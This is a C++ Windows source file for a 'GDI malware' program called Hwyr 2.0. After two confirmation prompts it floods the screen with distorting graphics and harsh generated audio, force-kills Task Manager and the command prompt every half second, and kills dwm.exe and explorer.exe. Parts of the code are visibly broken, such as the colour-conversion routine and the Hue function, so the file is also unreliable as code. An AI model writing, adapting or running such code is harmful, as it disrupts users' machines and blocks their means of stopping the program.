#include <windows.h>
#include <wingdi.h>
#include <mmsystem.h>
#include <ctime>
#include <cmath> 
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#pragma comment(lib,"-gdi32.lib")
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
DWORD Xorshift32() {
    xs ^= xs << 13;
    xs ^= xs << 17;
    xs ^= xs << 5;
    return xs;
}
static ULONGLONG n, r;
int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
};
unsigned int RGB;
}_RGBQUAD, *PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
} 
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int i = w * h;
	// this was remaked by soheilshahrab for dev-cpp users

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed + r + r;
		BYTE g = rgb.rgbGreen + g + i;
		BYTE b = rgb.rgbBlue + r + g + b;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = (_r, _g, _b);
		FLOAT rgbMax = (_r, _g, _b) / g;

		FLOAT fDelta = rgbMin - rgbMax;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

DWORD WINAPI HSL1(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;
		        
		        int h = screenHeight;
		        int w = screenWidth;
				INT Yii = y ^ y + i;
				INT Xii = x ^ x + i;
				INT Ssix = 6 * 10;
				INT Stwo = 2 * 10;
				FLOAT fx = (Xii + Yii) + (i + i * 10);

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .10f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}

DWORD WINAPI OldShader1(LPVOID lpParam) {
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        RGBQUAD rgbquad;
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand()%0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
            v = rand() % 2;
            int vide = rand() % 3;
            int x = i % w, y = i / w;
            int Xii = x + x + i, Yii = y + y + i;
                    *((BYTE*)data + 4 * i + x + y + vide) = *((BYTE*)(data + x + y));
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 

DWORD WINAPI Plgblt(LPVOID lpParam) {
	int inc = 1;
	RECT wRect;
	POINT wPt[3];
	while (1)
	{
		HDC hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &wRect);
		wPt[0].x = wRect.left + 200;
		wPt[0].y = wRect.top - 100;
		wPt[1].x = wRect.right + rand() % 100;
		wPt[1].y = wRect.top - rand() % 100;
		wPt[2].x = wRect.left - rand() % 100;
		wPt[2].y = wRect.bottom + rand() % 100;
		PlgBlt(hdc, wPt, hdc, wRect.left, wRect.top, wRect.right + wRect.left, wRect.bottom + wRect.top, 0, 0, 0);
	}
}

DWORD WINAPI Shader1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int Xii = x * x + i;
            int Yii = y * y + i;
            data[i].rgb -= Xii - Yii;
            //data[i].rgb -= Xii ^ Yii | x * y;
            //data[i].rgb -= Xii - i | Yii - i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI Shader2(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int Xii = x * x + i;
            int Yii = y * y + i;
            //data[i].rgb -= Xii - Yii;
            data[i].rgb -= Xii ^ Yii | x * y;
            //data[i].rgb -= Xii - i | Yii - i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}

DWORD WINAPI Shader3(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            int Xii = x * x + i;
            int Yii = y * y + i;
            //data[i].rgb -= Xii - Yii;
            //data[i].rgb -= Xii ^ Yii | x * y;
            data[i].rgb -= Xii - i | Yii - i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, NOTSRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
DWORD WINAPI draw1(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    _RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        int pertcangfiy = 5 + pertcangfiy;
        BitBlt(hdcdc, pertcangfiy, 0, w, h, desk, 0, 0, NOTSRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int randPixel = Xorshift32() % w;
            int tempR = GetRValue(data[i].rgb), tempG = GetGValue(data[i].rgb), tempB = GetBValue(data[i].rgb);
            int color = RGB(tempB, tempR, tempG);
            int x = i % w, y = i / w;
            int Xii = x & x;
            int Yii = y & y;
            data[i].r = color & color;
            data[i].g = Xii + Yii;
            data[i].b = x ^ y;
            data[randPixel].rgb = RGB(tempR, tempB, tempG);
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, pertcangfiy, 0, NOTSRCCOPY);
        BitBlt(desk, 0, 0, w, h, hdcdc, pertcangfiy - w + 160, 0, NOTSRCCOPY);
        BitBlt(desk, 0, 0, w, h, hdcdc, pertcangfiy - w - w + 160, 0, NOTSRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t & 200 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + t >> (t & 16384 ? t & 4096 ? 10 : 3 : t / 3000 < 2)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 90] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(3 * (t >> t ? rand() % 70 + 30 : 50));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
DWORD WINAPI sines1(LPVOID lpParam) {
	HDC hdc = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	for (;;) {
		hdc = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.00f) {
			int a = sin(angle) * 15;
			BitBlt(hdc, i * 1.5, 0, 5, sh, hdc, i * 1.5, a * 2, SRCCOPY);
			angle += M_PI / 12;
			DeleteObject(&a); DeleteObject(&i);
		}
		ReleaseDC(wnd, hdc);
		DeleteDC(hdc); DeleteObject(wnd); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
	}
}

DWORD WINAPI GREY(LPVOID lpvd)
{
	//Credits to ArTicZera and Rekto
	HDC hdc = GetDC(NULL);
	HDC dcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);

	BITMAPINFO bmpi = { 0 };
	BLENDFUNCTION blur;
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
	SelectObject(dcCopy, bmp);

	blur.BlendOp = AC_SRC_OVER;
	blur.BlendFlags = 0;
	blur.AlphaFormat = 0;
	blur.SourceConstantAlpha = 10;

	while (1) {
		hdc = GetDC(NULL);
		BitBlt(dcCopy, rand() % 20, rand() % 20, w, h, hdc, rand() % 20, rand() % 20, NOTSRCCOPY);
		AlphaBlend(hdc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI gradient1(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int xf = 0;
	int yf = 0;
	int signX = 15;
	int signY = 5;
	HDC hdc = GetDC(0);
	HBITMAP hbmTemp = CreateCompatibleBitmap(hdc, w, h);
	HDC hdcTemp = CreateCompatibleDC(hdc);
	SelectObject(hdcTemp, hbmTemp);
	int radius = 100.0f;
	double angle = 0;
	int x, y;
	int centerX, centerY;
	int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
	while (1) {
		hdc = GetDC(0);
		xf += signX;
		yf += signY;
		centerX = origX - (w / 4), centerY = origY - (h / 4);
		x = (cos(angle) * radius) + centerX, y = (sin(angle) * radius) + centerY;
		for (INT i = 64; i > 8; i -= 8)
		{
			TRIVERTEX vertex[2];
			vertex[0].x = 50 + x - i + xf;
			vertex[0].y = 50 + y - i + yf;
			vertex[0].Red = Hue(239);
			vertex[0].Green = 0;
			vertex[0].Blue = Hue(239);
			vertex[0].Alpha = 0;

			vertex[1].x = 100 + x + i + xf;
			vertex[1].y = 100 + y + i + yf;
			vertex[1].Red = Hue(239);
			vertex[1].Green = Hue(239);
			vertex[1].Blue = 0;
			vertex[1].Alpha = 0x0000;

			// Create a GRADIENT_RECT structure that 
			// references the TRIVERTEX vertices. 
			GRADIENT_RECT gRect;
			gRect.UpperLeft = 0;
			gRect.LowerRight = 1;

			// Draw a shaded rectangle. 
			GradientFill(hdc, vertex, 4, &gRect, 1, GRADIENT_FILL_RECT_H);
		}

		angle = fmod(angle + M_PI / radius, M_PI * radius);

		if (yf == 0)
		{
			signY = 3;
		}

		if (xf == 0)
		{
			signX = 18;
		}

		if (yf >= GetSystemMetrics(1))
		{
			signY -= 2;
		}

		if (xf >= GetSystemMetrics(0))
		{
			signX -= 20;
		}
		ReleaseDC(0, hdc);
	}
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 90] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 65536 < 59392 * rand()) + 200 * (t * ((t & 200 ? t % 65536 < 59392 ? 7 : t & 7 : 16) & 200 ? t % 65536 < 59392 ? 7 : t & 7 : 16 * t >> (t & 16384 ? t & 4096 ? 10 : 3 : t / 3000 < 2)))|t>>t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI HSL2(LPVOID lpvd) {
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int Xii = x * x, Yii = y * y;
				int inc = 1 + inc;
				int fx = (Xii + Yii + inc | Xii + Yii + inc) + (i * 100);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 1500.f + y / h * .1f + i / 5000.f, 1.f);
				hslcolor.s = 0.7f;
				hslcolor.l = 0.5f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}

DWORD WINAPI Shader5(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, NOTSRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int codelib = i + i;
			int code = codelib | x ^ y;
			rgbScreen[i].r += code;
			rgbScreen[i].g += code;
			rgbScreen[i].b += Hue(239) | codelib;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(1);
	}
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> ~rand() * rand()) + 200 * (t * t * 65536 < 59392 * rand()) + 200 * (~t & rand() * ((t & 200 ? t % 65536 < 59392 ? 7 : t & 7 : 16) & 200 ? t % 65536 < 59392 ? 7 : t & 7 : 16 * t >> (t & 16384 ? t & 4096 ? 10 : 3 : t / 3000 < 2)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 60] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(rand() % 560 + 30>>rand() % 560 + 30) / 3;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI TaskMgrObserver(LPVOID lpParam) {
	while (1) {
	system("taskkill /f /im taskmgr.exe");
	system("taskkill /f /im cmd.exe");
	Sleep(500);
	}
}

VOID WINAPI Error() {
    if (MessageBoxW(NULL, L"Open your task manager or command prompt and terminate it before it becomes late.", L"Hwyr 1.0.exe - Message", MB_OK | MB_ICONERROR) == IDOK)
    {
    }
}

int main(){
		    if (MessageBoxW(NULL, L"run short malware?", L"Hwyr 2.0.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
    if (MessageBoxW(NULL, L"are you sure? it shuts down your Desktop windows manager, And Pervents taskmanager from starting (terminates it repeatly every half second).", L"Hwyr 2.0.exe", MB_YESNO | MB_ICONWARNING) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        	Error();
			Sleep(2500);
			HANDLE thread0 = CreateThread(0, 0, TaskMgrObserver, 0, 0, 0);
			system("taskkill /f /im dwm.exe");
			Sleep(50);
			system("taskkill /f /im dwm.exe");
			Sleep(2500);
			sound1();
			HANDLE thread1 = CreateThread(0, 0, OldShader1, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, HSL1, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, Plgblt, 0, 0, 0);
			Sleep(15000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, draw1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread3, 0);
			CloseHandle(thread3);
			InvalidateRect(0, 0, 0);
			Sleep(10);
			sound2();
			sound2();
			HANDLE thread4 = CreateThread(0, 0, Shader1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread4, 0);
			CloseHandle(thread4);
			InvalidateRect(0, 0, 0);
			HANDLE thread5 = CreateThread(0, 0, Shader2, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			InvalidateRect(0, 0, 0);
			HANDLE thread6 = CreateThread(0, 0, Shader3, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			HANDLE thread7 = CreateThread(0, 0, gradient1, 0, 0, 0); //requires msimg32
			HANDLE thread7dot1 = CreateThread(0, 0, GREY, 0, 0, 0); //requires msimg32
			sound3();
			Sleep(30000);
			TerminateThread(thread7, 0);
			CloseHandle(thread7);
			TerminateThread(thread7dot1, 0);
			CloseHandle(thread7dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread7dot2 = CreateThread(0, 0, sines1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7dot2, 0);
			CloseHandle(thread7dot2);
			InvalidateRect(0, 0, 0);
			HANDLE thread7dot4 = CreateThread(0, 0, Shader5, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread7dot4, 0);
			CloseHandle(thread7dot4);
			InvalidateRect(0, 0, 0);
			HANDLE thread8 = CreateThread(0, 0, HSL2, 0, 0, 0);
			sound4();
			Sleep(30000);
			TerminateThread(thread8, 0);
			CloseHandle(thread8);
			InvalidateRect(0, 0, 0);
			system("taskkill /f /im explorer.exe");
			Sleep(50);
			InvalidateRect(0, 0, 0);
			system("taskkill /f /im explorer.exe");
			system("start winver.exe");
			TerminateThread(thread0, 0);
			CloseHandle(thread0);
	        ExitProcess(0);
        }
	}
}



